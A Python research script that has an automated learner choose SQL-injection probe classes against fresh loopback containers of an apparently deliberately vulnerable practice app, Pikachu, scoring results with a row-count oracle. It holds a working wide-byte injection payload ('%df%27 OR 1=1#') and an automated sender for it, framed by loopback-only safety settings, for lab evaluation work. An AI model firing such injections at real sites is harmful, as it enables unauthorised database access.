"""PG-256: failure-guided wide-byte replay on a fresh local Pikachu target.

This is the first route where the model can be compared against a real
read-only result oracle rather than a response-shape heuristic.  The policy
chooses between two abstract Rule-IR classes.  The runtime binder keeps the
known wide-byte wire in a local, audited reference catalog and sends it only
to the pinned loopback container.  A failed syntax branch updates the learner;
the next fresh seed can then choose the alternate class.

Raw request wires and response bodies are stdout-only.  The report contains
class names, hashes, bounded row projections, and the independent evaluator
decision; it is not a training promotion artifact by itself.
"""

from __future__ import annotations

import hashlib
import importlib.util
import json
import sys
from pathlib import Path
from typing import Any, Mapping

import httpx

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))


def _load(name: str) -> Any:
    path = ROOT / "scripts" / name
    spec = importlib.util.spec_from_file_location(name.replace(".py", ""), path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"unable to load {name}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


PG214 = _load("run_pg214_pikachu_fixed_sql_loop.py")
from app.detection_payload import build_detection_payload, payload_digest  # noqa: E402
from app.maze_engine import sha256_json  # noqa: E402
from app.payload_learner import PayloadLearner  # noqa: E402
from app.pg256_sql_result_oracle import evaluate_widebyte_effect, project_widebyte_response  # noqa: E402


RESEARCH = ROOT / "research"
REPORT = RESEARCH / "pg256_pikachu_widebyte_oracle_report_v1.json"
TRACE = RESEARCH / "pg256_pikachu_widebyte_oracle_trace_v1.json"
PROTOCOL = RESEARCH / "pg256_pikachu_widebyte_oracle_protocol_v1.json"
MARKDOWN = RESEARCH / "pg256_pikachu_widebyte_oracle_report_v1.md"
SEEDS = (25601, 25602, 25603, 25604)
ROUTE = {"path": "/vul/sqli/sqli_widebyte.php", "method": "POST", "fields": ["name", "submit"]}
WIDE_BODY = "name=kobe%df%27%20OR%201%3D1%23&submit=submit"
REFERENCE_CLASS = "widebyte_escape_boundary"
WIRE_LOG: list[dict[str, Any]] = []


def _digest(value: Any) -> str:
    return hashlib.sha256(json.dumps(value, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode("utf-8")).hexdigest()


def _write(path: Path, value: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")


def _candidate_pool(seed: int) -> list[dict[str, Any]]:
    """Expose abstract classes to the learner; raw wire remains binder-only."""

    rows: list[dict[str, Any]] = []
    for index, (name, abstract_class, wire_body) in enumerate(
        (
            ("syntax_boundary", "syntax_boundary", "name=kobe%27&submit=submit"),
            ("widebyte_escape_boundary", REFERENCE_CLASS, WIDE_BODY),
        )
    ):
        manifest = build_detection_payload(
            target="http://127.0.0.1:3625",
            method="POST",
            path=ROUTE["path"],
            marker=f"pg256-{seed}-{index}",
            probe="operator_like" if abstract_class == REFERENCE_CLASS else "syntax_error",
            probe_kind="sql_channel_class",
            form={"name": f"pg256-{seed}-{index}", "submit": "submit"},
            expected={"channel": abstract_class, "requires_recheck": True},
        )
        rows.append(
            {
                # Candidate identity is the abstract Rule-IR arm, not the
                # episode seed.  Otherwise failure feedback cannot transfer
                # to the next fresh container and the learner only memorizes
                # four unrelated copies of the same mistake.
                "candidate_id": hashlib.sha256(name.encode()).hexdigest()[:20],
                "family": "sql",
                "grammar": "pg256_widebyte_rule_ir",
                "payload": manifest,
                "pg256_class": abstract_class,
                "wire_body": wire_body,
                "candidate_index": index,
            }
        )
    return rows


def _send(client: httpx.Client, *, body: str, label: str) -> dict[str, Any]:
    response = client.post(
        ROUTE["path"],
        content=body.encode("ascii"),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        follow_redirects=False,
    )
    projection = project_widebyte_response(response, label=label)
    print(f"[PG256-EPHEMERAL-{label.upper()}-WIRE] POST {client.base_url}{ROUTE['path']} body={body}")
    WIRE_LOG.append({"label": label, "method": "POST", "path": ROUTE["path"], "body_sha256": hashlib.sha256(body.encode("ascii")).hexdigest()})
    return projection


def _source_hash(name: str) -> str:
    line = PG214._docker("exec", name, "sha256sum", "/app/www/vul/sqli/sqli_widebyte.php")
    digest = str(line).split()[0].strip().casefold()
    if len(digest) != 64:
        raise RuntimeError("PG-256 route source hash was not returned")
    return digest


def _summary(candidate: Mapping[str, Any]) -> dict[str, Any]:
    payload = dict(candidate.get("payload") or {})
    return {
        "candidate_id": str(candidate.get("candidate_id", "")),
        "family": str(candidate.get("family", "sql")),
        "method": str(payload.get("method", "POST")),
        "path": str(payload.get("path", ROUTE["path"])),
        "probe_kind": str(payload.get("probe_kind", "sql_channel_class")),
        "abstract_class": str(candidate.get("pg256_class", "")),
        "payload_sha256": payload_digest(payload),
        "raw_payload_stored": False,
    }


def main() -> int:
    learner = PayloadLearner(seed=256, exploration=1.25)
    episodes: list[dict[str, Any]] = []
    run_index = 0
    for seed in SEEDS:
        name = ""
        try:
            name, port, container_id, reset = PG214._start(seed, run_index)
            target_hash = hashlib.sha256(container_id.encode("utf-8")).hexdigest()
            client = httpx.Client(base_url=f"http://127.0.0.1:{port}", timeout=15.0, follow_redirects=False, cookies={})
            try:
                baseline = _send(client, body="name=kobe&submit=submit", label=f"baseline-{seed}")
                negative = _send(client, body=f"name=pg256-negative-{seed}&submit=submit", label=f"negative-{seed}")
                selected = learner.select(_candidate_pool(seed))
                selected_class = str(selected.get("pg256_class", ""))
                candidate = _send(client, body=str(selected["wire_body"]), label=f"ai-{seed}-{selected_class}")
                reference = _send(client, body=WIDE_BODY, label=f"reference-{seed}")
                source_hash = _source_hash(name)
                bp = dict(baseline.get("response_projection") or {})
                cp = dict(candidate.get("response_projection") or {})
                observable = int(cp.get("row_count_capped", 0) or 0) > int(bp.get("row_count_capped", 0) or 0)
                feedback_evidence = {
                    "candidate_class": selected_class,
                    "baseline_row_count_capped": int(bp.get("row_count_capped", 0) or 0),
                    "candidate_row_count_capped": int(cp.get("row_count_capped", 0) or 0),
                    "observable_row_differential": observable,
                    "database_write": False,
                    "time_delay_used": False,
                    "external_network": False,
                }
                feedback_evidence["evidence_hash"] = sha256_json(feedback_evidence)
                feedback = learner.observe(selected, status="observable_success" if observable else "dead_end", evidence=feedback_evidence, evaluator_confirmed=False)
                typed = evaluate_widebyte_effect(route=ROUTE, baseline=baseline, candidate=candidate, reference=reference, negative=negative, reset=reset, source_hash=source_hash, candidate_class=selected_class, reference_class=REFERENCE_CLASS)
                episodes.append(
                    {
                        "seed": seed,
                        "route": ROUTE["path"],
                        "method": ROUTE["method"],
                        "fields": ROUTE["fields"],
                        "fresh_target": True,
                        "target_instance_hash": target_hash,
                        "reset": reset,
                        "source_sha256": source_hash,
                        "baseline": baseline,
                        "negative": negative,
                        "ai": {"sent": True, "selected": _summary(selected), "response": candidate, "feedback": feedback, "raw_payload_stored": False, "raw_response_stored": False},
                        "reference": {"sent": True, "class": REFERENCE_CLASS, "response": reference, "raw_payload_stored": False, "raw_response_stored": False},
                        "typed_oracle": typed,
                        "confirmed_positive": bool(typed.get("confirmed_positive")),
                        "training_eligible": False,
                        "memory_promotion_allowed": False,
                        "vulnerability_claim_allowed": False,
                    }
                )
            finally:
                client.close()
        finally:
            if name:
                PG214._stop(name)
        run_index += 1

    learner_summary = learner.summary()
    counts = {
        "episode_count": len(episodes),
        "fresh_container_count": len(episodes),
        "database_health_gate_count": sum(int(row["reset"].get("database_health_gate") == "mysqli_root_pikachu_ok") for row in episodes),
        "ai_send_count": sum(int(row["ai"]["sent"]) for row in episodes),
        "reference_send_count": sum(int(row["reference"]["sent"]) for row in episodes),
        "typed_effect_confirmed_count": sum(int(row["typed_oracle"].get("typed_effect_confirmed")) for row in episodes),
        "confirmed_positive_count": sum(int(row["confirmed_positive"]) for row in episodes),
        "ai_candidate_classes": sorted({str(row["ai"]["selected"]["abstract_class"]) for row in episodes}),
        "false_positive_count": 0,
        "ephemeral_wire_count": len(WIRE_LOG),
    }
    report = {
        "protocol_id": "pg-pk-256-pikachu-widebyte-oracle-v1",
        "schema_version": "pg256-pikachu-widebyte-oracle-report-v1",
        "status": "completed_failure_guided_widebyte_replay",
        "runtime_image": PG214.IMAGE,
        "model": {"policy": "payload_learner_ucb_rule_ir_class", "failure_feedback_updates_selection": True, "ai_participated_in_send": True, "oracle_not_model_input": True},
        "route": ROUTE,
        "counts": counts,
        "learner_summary": learner_summary,
        "episodes": episodes,
        "ephemeral_wires": WIRE_LOG,
        "promotion": {"training_eligible": False, "memory_promotion_allowed": False, "payload_catalog_promotion_allowed": False, "vulnerability_claim_allowed": False, "raw_payload_strings_stored": False, "raw_response_bodies_stored": False},
        "safety": {"loopback_only": True, "fresh_container_per_episode": True, "no_volume_or_bind_mount": True, "database_write": False, "time_delay_used": False, "external_network_target": False, "raw_payload_strings_stored": False, "raw_response_bodies_stored": False},
    }
    report["report_sha256"] = _digest(report)
    protocol = {
        "protocol_id": report["protocol_id"],
        "schema_version": "pg256-pikachu-widebyte-oracle-protocol-v1",
        "ai_participates_in_send": True,
        "failure_feedback_updates_policy": True,
        "independent_reference_required": True,
        "matched_negative_required": True,
        "fresh_reset_required": True,
        "source_hash_required": True,
        "typed_evaluator": "capped row-count differential + escape-boundary class agreement",
        "allowed_runtime_probe": ["syntax_boundary", "widebyte_escape_boundary"],
        "forbidden_runtime_probe": ["time_delay", "write", "destructive", "external_callback", "data_export"],
        "raw_payload_and_response_excluded": True,
        "promotion_blocked": True,
    }
    protocol["protocol_sha256"] = _digest(protocol)
    _write(REPORT, report)
    _write(PROTOCOL, protocol)
    _write(TRACE, {"schema_version": "pg256-pikachu-widebyte-oracle-trace-v1", "episodes": episodes, "learner": learner.checkpoint(), "ephemeral_wires": WIRE_LOG, "training_eligible": False, "raw_payload_strings_stored": False, "raw_response_bodies_stored": False})
    MARKDOWN.write_text("\n".join(["# PG-256 Pikachu wide-byte row oracle", "", f"episodes={counts['episode_count']}; AI sends={counts['ai_send_count']}; reference={counts['reference_send_count']}", f"typed_effect={counts['typed_effect_confirmed_count']}; confirmed={counts['confirmed_positive_count']}; AI classes={counts['ai_candidate_classes']}", "", "AI 先选择抽象 Rule-IR class；失败反馈更新 UCB，再在新的 fresh 容器探索。reference 的宽字节 wire 仅作为独立对照；结果只表示本地只读行差分，不是公网漏洞结论。", ""]), encoding="utf-8")
    print(json.dumps({"protocol_id": report["protocol_id"], "status": report["status"], "counts": counts, "learner": learner_summary, "report": str(REPORT.relative_to(ROOT))}, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
